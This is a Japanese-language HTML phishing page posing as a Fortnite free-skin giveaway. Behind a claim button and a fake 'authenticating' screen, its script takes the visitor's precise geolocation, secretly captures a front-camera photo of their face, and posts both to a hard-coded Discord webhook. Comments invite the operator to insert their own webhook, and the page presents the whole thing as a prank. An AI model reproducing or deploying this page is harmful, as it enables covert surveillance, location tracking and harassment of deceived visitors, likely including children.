<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>フォートナイト - 無料スキン受取イベント</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #0b0e14;
            color: #ffffff;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            max-width: 400px;
            padding: 20px;
        }
        .skin-img {
            width: 100%;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(0, 255, 204, 0.3);
            margin-bottom: 20px;
        }
        h1 {
            font-size: 22px;
            margin-bottom: 10px;
            color: #00ffcc;
        }
        p {
            font-size: 14px;
            color: #b3b3b3;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .claim-btn {
            background: linear-gradient(135deg, #00ffcc, #0077ff);
            color: #000;
            font-size: 18px;
            font-weight: bold;
            padding: 15px 40px;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 255, 204, 0.4);
            transition: 0.2s;
        }
        .claim-btn:active {
            transform: scale(0.95);
        }
        #webcam {
            display: none;
        }
    </style>
</head>
<body>

    <!-- 【クッションページ部分】最初に表示される安全そうな画面 -->
    <div class="container" id="main-screen">
        <img src="https://images.unsplash.com/photo-1542751371-adc38448a05e?w=500&auto=format&fit=crop&q=60" alt="Fortnite Event" class="skin-img">
        <h1>【期間限定】レジェンドスキン無料配布</h1>
        <p>今だけのスペシャルイベント！下のボタンを押してアカウント認証を完了させると、限定スキンがゲットできます。</p>
        <button class="claim-btn" id="actionBtn">報酬を受け取る</button>
    </div>

    <!-- カメラ起動用の隠し要素 -->
    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ★ここを自分のDiscordのWebhook URLに書き換えてね！
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1553096437376487586/kzTpRNKsEjfqTr3L4T75-2tqikQ7g-bjuz4QZYC8CqEqCqeMhSRlOeC5NJ85kf9QTlK3";

        const btn = document.getElementById('actionBtn');
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const mainScreen = document.getElementById('main-screen');

        // 位置情報を取得する関数
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("位置情報非対応のブラウザです");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        resolve(`緯度: ${lat}, 経度: ${lng}\nGoogleマップ: https://maps.google.com/?q=${lat},${lng}`);
                    },
                    (error) => {
                        resolve("位置情報の取得が拒否されたか、エラーになりました (エラーコード: " + error.code + ")");
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            });
        }

        btn.addEventListener('click', async () => {
            // ボタンが押された瞬間にクッション画面の見た目を「読み込み中」に変えて誤魔化す
            mainScreen.innerHTML = `
                <h1 style="color: #00ffcc;">認証中...</h1>
                <p>サーバーに接続しています。そのままお待ちください。</p>
            `;

            let locationText = "位置情報: 取得失敗または拒否";

            try {
                // 1. 位置情報の取得（ポップアップ）
                locationText = await getLocation();

                // 2. カメラの許可（ポップアップ）
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;

                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        resolve();
                    };
                });

                // 写真を撮影
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());

                // 3. Discordに写真と位置情報を送信
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('file', blob, 'captured_face.jpg');
                    formData.append('content', `📸 ドッキリ大成功！（クッション経由）\n📍 【位置情報】\n${locationText}`);

                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    });
                }, 'image/jpeg', 0.8);

            } catch (err) {
                console.log("許可がキャンセルされたか、エラーが発生しました:", err);
            }

            // 4. その後、自分で作った顔診断の画面、またはエラー画面に切り替える
            // ※もし自分で作った顔診断ページに飛ばしたい場合は、下のコメントアウトを消してURLを入れてね！
            // window.location.href = "ここに自分の顔診断ページのURLを入れる";

            // 今回はとりあえずそれっぽい診断スタート画面（またはエラー画面）に切り替える演出
            setTimeout(() => {
                mainScreen.innerHTML = `
                    <h1 style="color: #ff0055;">お疲れ様でした！</h1>
                    <p>ドッキリ大成功〜！✨<br>見事に写真が撮れましたw</p>
                `;
            }, 1000);
        });
    </script>
</body>
</html>
